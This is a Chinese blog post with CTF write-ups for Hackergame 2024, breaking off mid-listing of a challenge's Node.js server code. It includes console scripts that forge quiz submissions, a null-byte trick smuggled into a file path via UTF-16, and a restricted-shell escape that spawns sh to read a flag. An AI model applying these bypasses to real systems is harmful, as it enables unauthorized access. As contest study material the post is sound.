<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackergame2024 | Boranget.博客</title><meta name="author" content="Boranget"><meta name="copyright" content="Boranget"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="相关资料https:&#x2F;&#x2F;hack.lug.ustc.edu.cn&#x2F; 签到本人解法获取placeholder然后填入文本框 1234567891011let a &#x3D; document.getElementById(&quot;inputs-container&quot;)a.childNodes.forEach((c)&#x3D;&gt;&amp;#123;    if(c.nodeType &#x3D;&#x3D; 1)&amp;#123;">
<meta property="og:type" content="article">
<meta property="og:title" content="hackergame2024">
<meta property="og:url" content="https://boranget.github.io/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/index.html">
<meta property="og:site_name" content="Boranget.博客">
<meta property="og:description" content="相关资料https:&#x2F;&#x2F;hack.lug.ustc.edu.cn&#x2F; 签到本人解法获取placeholder然后填入文本框 1234567891011let a &#x3D; document.getElementById(&quot;inputs-container&quot;)a.childNodes.forEach((c)&#x3D;&gt;&amp;#123;    if(c.nodeType &#x3D;&#x3D; 1)&amp;#123;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://boranget.github.io/assets/img/tx.png">
<meta property="article:published_time" content="2025-06-20T02:35:19.000Z">
<meta property="article:modified_time" content="2025-06-20T02:35:19.000Z">
<meta property="article:author" content="Boranget">
<meta property="article:tag" content="hackergame">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://boranget.github.io/assets/img/tx.png"><link rel="shortcut icon" href="/assets/img/tx.png"><link rel="canonical" href="https://boranget.github.io/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'hackergame2024',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-06-20 10:35:19'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/assets/img/tx.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">191</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">198</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Boranget.博客"><img class="site-icon" src="/assets/img/tx.png"/><span class="site-name">Boranget.博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">hackergame2024</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-20T02:35:19.000Z" title="发表于 2025-06-20 10:35:19">2025-06-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-20T02:35:19.000Z" title="更新于 2025-06-20 10:35:19">2025-06-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="hackergame2024"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1><p><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn/</a></p>
<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="本人解法"><a href="#本人解法" class="headerlink" title="本人解法"></a>本人解法</h2><p>获取placeholder然后填入文本框</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;inputs-container&quot;</span>)</span><br><span class="line">a.<span class="property">childNodes</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">c</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c.<span class="property">nodeType</span> == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> en = c.<span class="title function_">getAttribute</span>(<span class="string">&quot;placeHolder&quot;</span>).<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(!en)&#123;</span><br><span class="line">            en = c.<span class="title function_">getAttribute</span>(<span class="string">&quot;placeHolder&quot;</span>).<span class="title function_">split</span>(<span class="string">&quot;：&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(en)</span><br><span class="line">        c.<span class="property">value</span> = en.<span class="title function_">trim</span>();</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="官方解法"><a href="#官方解法" class="headerlink" title="官方解法"></a>官方解法</h2><p>回答错误后，地址栏会出现flag&#x3D;false，改为flag&#x3D;true回车即可</p>
<h1 id="喜欢做签到的-CTFer-你们好呀"><a href="#喜欢做签到的-CTFer-你们好呀" class="headerlink" title="喜欢做签到的 CTFer 你们好呀"></a>喜欢做签到的 CTFer 你们好呀</h1><h2 id="个人解法"><a href="#个人解法" class="headerlink" title="个人解法"></a>个人解法</h2><p>进入招新主页<a target="_blank" rel="noopener" href="https://www.nebuu.la/">https://www.nebuu.la/</a></p>
<p>输入env，会得到第一个flag</p>
<p><img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250620135740758.png" alt="image-20250620135740758"></p>
<h2 id="官方解法-1"><a href="#官方解法-1" class="headerlink" title="官方解法"></a>官方解法</h2><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p><a target="_blank" rel="noopener" href="https://www.nebuu.la/_next/static/chunks/pages/index-5cb01f7ec808f452.js">nebuu.la&#x2F;_next&#x2F;static&#x2F;chunks&#x2F;pages&#x2F;index-5cb01f7ec808f452.js</a></p>
<p>进入招新主页，f12找到如上代码，其中有flag的base64内容</p>
<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>在主页中执行ls -a，可找到.flag文件，里面是第二个flag</p>
<h1 id="猫咪"><a href="#猫咪" class="headerlink" title="猫咪"></a>猫咪</h1><ol>
<li><a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/wiki/sec/contest.html">https://lug.ustc.edu.cn/wiki/sec/contest.html</a></li>
<li><a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/">https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/</a><br> 具体的题目数是从官方github页面统计的</li>
<li><a target="_blank" rel="noopener" href="https://www.ittc.ku.edu/~bluo/pubs/ma2024fakebehalf.pdf">https://www.ittc.ku.edu/~bluo/pubs/ma2024fakebehalf.pdf</a><br> <img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250620145534591.png" alt="image-20250620145534591"></li>
<li><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2">https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2</a></li>
<li><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e90b675cf942e50c70e8394dfb5862975c3b3b2">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e90b675cf942e50c70e8394dfb5862975c3b3b2</a></li>
</ol>
<h2 id="官方"><a href="#官方" class="headerlink" title="官方"></a>官方</h2><p>3：hackergame2018-writeups&#x2F;misc&#x2F;others.md at master · ustclug&#x2F;hackergame2018-writeups · GitHub](<a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md">https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md</a>)</p>
<p>6: 需要执行python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> transformers</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tk=transformers.AutoTokenizer.from_pretrained(<span class="string">&quot;meta-llama/Meta-Llama-3-70B&quot;</span>)</span><br><span class="line">s=requests.session()</span><br><span class="line">t=s.get(<span class="string">&quot;http://202.38.93.141:13030/&quot;</span>, cookies=&#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;REDACTED&quot;</span>&#125;).text</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(tk.encode(t)))</span><br></pre></td></tr></table></figure>



<h1 id="打不开的盒子"><a href="#打不开的盒子" class="headerlink" title="打不开的盒子"></a>打不开的盒子</h1><p>3dmax打开后删除顶面</p>
<p><img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250620152042722.png" alt="image-20250620152042722"></p>
<p>flag{Dr4W_Us!nG_fR3E_C4D!!w0W}</p>
<h1 id="每日论文太多了"><a href="#每日论文太多了" class="headerlink" title="每日论文太多了"></a>每日论文太多了</h1><p>改论文能搜到一个透明flag，但是没后续的内容</p>
<h2 id="官方解法-2"><a href="#官方解法-2" class="headerlink" title="官方解法"></a>官方解法</h2><p>该flag上盖了一张白色的图片，用pdf工具移开即可</p>
<h1 id="大小王"><a href="#大小王" class="headerlink" title="大小王"></a>大小王</h1><p>通过比较两边的值获取inputs的答案，修改原代码的updateTimer进行循环</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">updateTimer</span>(<span class="params"></span>) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span>(state.<span class="property">value1</span> &lt; state.<span class="property">value2</span>)&#123;</span><br><span class="line">        <span class="title function_">chooseAnswer</span>(<span class="string">&quot;&lt;&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">chooseAnswer</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>控制台中执行如下命令，但是响应为检测到异常提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state.score1=100</span><br><span class="line">state.inputs = [&#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;]</span><br><span class="line">submit(state.inputs);</span><br></pre></td></tr></table></figure>

<p>发现原理每次的值都不一样，所以每次刷新后重新计算并提交</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">state.<span class="property">values</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">a</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">0</span>]&gt;a[<span class="number">1</span>])&#123;</span><br><span class="line">        state.<span class="property">inputs</span>.<span class="title function_">push</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        state.<span class="property">inputs</span>.<span class="title function_">push</span>(<span class="string">&quot;&lt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="title function_">submit</span>(state.<span class="property">inputs</span>)</span><br></pre></td></tr></table></figure>

<p>成功获取flag</p>
<h1 id="照片"><a href="#照片" class="headerlink" title="照片"></a>照片</h1><h2 id="个人解法-1"><a href="#个人解法-1" class="headerlink" title="个人解法"></a>个人解法</h2><p><strong>照片拍摄的位置距离中科大的哪个校门更近？</strong></p>
<p>暴力尝试直接</p>
<p><strong>科大今年的 ACG 音乐会？活动日期</strong></p>
<p><a target="_blank" rel="noopener" href="https://tieba.baidu.com/p/9022584688">https://tieba.baidu.com/p/9022584688</a></p>
<p>贴吧的直播日期</p>
<p><strong>动车车型</strong><br>4编组列车思路出发，查到了类似的图片怀密号</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/346241499">https://zhuanlan.zhihu.com/p/346241499</a></p>
<p>型号应该是CRH6F-A，但站看着像北京北站（红色屋顶），但是有很多细节对不上</p>
<h2 id="官方解法-3"><a href="#官方解法-3" class="headerlink" title="官方解法"></a>官方解法</h2><ol>
<li><p><img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250624211117983.png" alt="image-20250624211117983"></p>
</li>
<li><p><img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250624211259876.png" alt="image-20250624211259876">垃圾桶上写着”六安园林”，</p>
<blockquote>
<p>其实这种专供打卡的地标，几乎一定会出现在小红书上…… 并且小红书的推荐算法异常强悍，只需要搜索「六安」、「公园」，就能在前几个搜索结果中得到答案「中央森林公园」</p>
</blockquote>
</li>
<li><p>直接百度识图<img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250624211709885.png" alt="image-20250624211709885"></p>
</li>
<li><p>确实是怀密线，但不是具体某个站点，而是中途</p>
<p><img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250624212347188.png" alt="image-20250624212347188"></p>
</li>
</ol>
<h1 id="不宽的宽字符"><a href="#不宽的宽字符" class="headerlink" title="不宽的宽字符"></a>不宽的宽字符</h1><p>这里想输入<code>\0</code>避免他加字符，但怎么输入是个问题</p>
<p>使用java尝试但是失败</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;nc 202.38.93.141 14202&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">consoleReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 循环</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">                <span class="keyword">if</span> (line == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                <span class="comment">// 获取控制台输入</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> consoleReader.readLine();</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;test&quot;</span>.equals(input)) &#123;</span><br><span class="line">                    input = <span class="string">&quot;Z:\\theflag&quot;</span>+<span class="number">0x00</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;token&quot;</span>.equals(input)) &#123;</span><br><span class="line">                    input = <span class="string">&quot;4305:MEYCIQD6SFEdceMjzNkciHcHlkey+g8Yd/PXFsPsANIn8QfvZQIhAIuyium/5mivOpzX/ERUdxceTGmBQlb6ulOeOFvl3K6m\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                process.getOutputStream().write((input).getBytes());</span><br><span class="line">                process.getOutputStream().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查找宽字符转char的步骤，发现宽字符是utf-8，窄字符是ascii，那接找哪个字符可以将终止符包含进去</p>
<h2 id="官方解法-4"><a href="#官方解法-4" class="headerlink" title="官方解法"></a>官方解法</h2><p>找多字节字符包含终止符的思路是对的，可以让两两一位合成同一个字符，且使用小端字节序：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;theflag\x00&#x27;</span>.decode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="PowerfulShell"><a href="#PowerfulShell" class="headerlink" title="PowerfulShell"></a>PowerfulShell</h1><p>思路是使用八进制，但是圆括号和单引号都被禁止了</p>
<h2 id="官方解法-5"><a href="#官方解法-5" class="headerlink" title="官方解法"></a>官方解法</h2><p>使用变量值的字符串拼接</p>
<p>~为home目录</p>
<p>-为作者隐藏的变量</p>
<p>拼接出sh，执行后会打开新的终端，在里面直接cat即可</p>
<p><img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250624221554659.png" alt="image-20250624221554659"></p>
<h1 id="Node-js-is-Web-Scale"><a href="#Node-js-is-Web-Scale" class="headerlink" title="Node.js is Web Scale"></a>Node.js is Web Scale</h1><p>相关代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; execSync &#125; = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title 